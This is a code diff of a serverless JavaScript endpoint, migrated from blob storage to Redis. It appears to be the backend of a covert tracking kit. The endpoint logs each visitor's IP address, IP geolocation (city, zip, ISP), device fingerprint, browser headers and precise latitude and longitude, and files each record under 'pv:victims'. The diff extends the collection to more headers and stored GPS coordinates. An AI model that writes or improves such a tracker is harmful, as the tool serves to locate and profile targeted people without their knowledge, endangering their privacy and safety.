@@ -1,42 +1,42 @@
-const { put, get } = require('@vercel/blob');
+const { Redis } = require('@upstash/redis');
+const kv = new Redis({
+  url: process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL || 'https://invalid.upstash.io',
+  token: process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN || 'invalid'
+});
 
 module.exports = async function handler(req, res) {
-  if (req.method !== 'POST') {
-    return res.status(404).end();
-  }
+  if (req.method !== 'POST') { return res.status(404).end(); }
   try {
     const ip = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || '0.0.0.0').split(',')[0].trim();
     const body = (req.body && typeof req.body === 'object') ? req.body : {};
     const id = String(body.x || '').slice(0, 40).replace(/[^a-zA-Z0-9_-]/g, '');
-    if (!id) {
-      return res.status(204).end();
-    }
+    if (!id) { return res.status(204).end(); }
 
     const now = Date.now();
     let geo = null;
-    const geoPath = 'geo/' + ip.replace(/[^a-zA-Z0-9._-]/g, '_') + '.json';
-    const cached = await readJSON(geoPath);
-    if (cached && typeof cached.ts === 'number' &&
-      now - cached.ts < (cached.data && cached.data.err ? 3600e3 : 604800e3)) {
+    const geoKey = 'pv:geo:' + ip.replace(/[^a-zA-Z0-9._-]/g, '_');
+    const cached = await readJSON(geoKey);
+    if (cached && typeof cached.ts === 'number' && now - cached.ts < (cached.data && cached.data.err ? 3600e3 : 604800e3)) {
       geo = cached.data;
     } else {
       geo = await lookupGeo(ip);
-      if (geo) await writeJSON(geoPath, { ts: now, data: geo });
+      if (geo) await writeJSON(geoKey, { ts: now, data: geo }, cached && cached.data && cached.data.err ? 3600 : 604800);
     }
 
-    const path = 'victims/' + id + '.json';
-    const prev = (await readJSON(path)) || {};
+    const prevRaw = await kv.hget('pv:victims', id);
+    let prev = {};
+    try { prev = prevRaw ? JSON.parse(prevRaw) : {}; } catch (e) { prev = {}; }
 
     const chModel = String(req.headers['sec-ch-ua-model'] || '').replace(/"/g, '').trim();
     const chPv = String(req.headers['sec-ch-ua-platform-version'] || '').replace(/"/g, '').trim();
     const fp = String(body.f || '').slice(0, 40).replace(/[^a-zA-Z0-9_-]/g, '');
-    const known = fp ? (await readJSON('dev/' + fp + '.json')) || null : null;
+    const known = fp ? await readJSON('pv:dev:' + fp) : null;
 
-    const rec = Object.assign({}, prev, body, {
-      ts: new Date().toISOString(),
-      ip: ip,
-      geo: geo || null
-    });
+    const h = {};
+    const hk = ['sec-ch-ua', 'sec-ch-ua-platform', 'sec-ch-ua-mobile', 'accept-language', 'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-dest', 'accept-encoding', 'x-vercel-id', 'accept'];
+    for (const k of hk) { if (req.headers[k]) h[k] = String(req.headers[k]).slice(0, 300); }
+
+    const rec = Object.assign({}, prev, body, { ts: new Date().toISOString(), ip: ip, geo: geo || null, h: h });
     if (!rec.hm && chModel) rec.hm = chModel;
     if (!rec.pv && chPv) rec.pv = chPv;
     if (known) {
@@ -46,13 +46,19 @@ module.exports = async function handler(req, res) {
       if (!rec.os && known.os) rec.os = known.os;
       if (!rec.pv && known.pv) rec.pv = known.pv;
       if (!rec.app && known.app) rec.app = known.app;
+      if (rec.glat == null && known.glat != null) { rec.glat = known.glat; rec.glon = known.glon; rec.gacc = known.gacc; }
     }
-    await writeJSON(path, rec);
-    if (fp && (rec.hm || rec.y || rec.os)) {
-      await writeJSON('dev/' + fp + '.json', {
-        f: fp, hm: rec.hm || '', y: rec.y || '', av: rec.av || '',
-        os: rec.os || '', pv: rec.pv || '', app: rec.app || '', ts: rec.ts
-      });
+
+    const fields = {};
+    fields[id] = JSON.stringify(rec);
+    await kv.hset('pv:victims', fields);
+
+    const changedDev = !known || known.hm !== rec.hm || known.y !== rec.y || known.os !== rec.os || known.app !== rec.app || (rec.glat != null && rec.glat !== known.glat);
+    if (fp && changedDev && (rec.hm || rec.y || rec.os)) {
+      await writeJSON('pv:dev:' + fp, {
+        f: fp, hm: rec.hm || '', y: rec.y || '', av: rec.av || '', os: rec.os || '', pv: rec.pv || '', app: rec.app || '',
+        glat: rec.glat != null ? rec.glat : null, glon: rec.glon != null ? rec.glon : null, gacc: rec.gacc != null ? rec.gacc : null, ts: rec.ts
+      }, 2592000);
     }
 
     return res.status(204).end();
@@ -62,31 +68,21 @@ module.exports = async function handler(req, res) {
   }
 };
 
-async function readJSON(pathname) {
+async function readJSON(key) {
   try {
-    const r = await get(pathname, { access: 'private', useCache: false });
-    if (!r) return null;
-    const text = await new Response(r.stream).text();
-    return JSON.parse(text);
-  } catch (e) {
-    console.error('PXR_READ_ERR', pathname, e && (e.message || e));
-    return null;
-  }
+    const v = await kv.get(key);
+    if (!v) return null;
+    return typeof v === 'string' ? JSON.parse(v) : v;
+  } catch (e) { console.error('PXR_READ_ERR', key, e && (e.message || e)); return null; }
 }
 
-async function writeJSON(pathname, value) {
+async function writeJSON(key, value, ex) {
   try {
-    await put(pathname, JSON.stringify(value), {
-      access: 'private',
-      allowOverwrite: true,
-      contentType: 'application/json',
-      addRandomSuffix: false
-    });
+    const s = JSON.stringify(value);
+    if (ex) await kv.set(key, s, { ex: ex });
+    else await kv.set(key, s);
     return true;
-  } catch (e) {
-    console.error('PXR_WRITE_ERR', pathname, e && (e.message || e));
-    return false;
-  }
+  } catch (e) { console.error('PXR_WRITE_ERR', key, e && (e.message || e)); return false; }
 }
 
 async function lookupGeo(ip) {
@@ -98,15 +94,8 @@ async function lookupGeo(ip) {
     return {
       lat: j.latitude !== undefined ? j.latitude : null,
       lon: j.longitude !== undefined ? j.longitude : null,
-      city: j.city || '',
-      region: j.region || '',
-      country: j.country || '',
-      zip: j.postal || '',
-      isp: j.connection && j.connection.isp || '',
-      org: j.connection && j.connection.org || '',
-      asn: j.connection && j.connection.asn || ''
+      city: j.city || '', region: j.region || '', country: j.country || '', zip: j.postal || '',
+      isp: j.connection && j.connection.isp || '', org: j.connection && j.connection.org || '', asn: j.connection && j.connection.asn || ''
     };
-  } catch (e) {
-    return { err: 1 };
-  }
+  } catch (e) { return { err: 1 }; }
 }
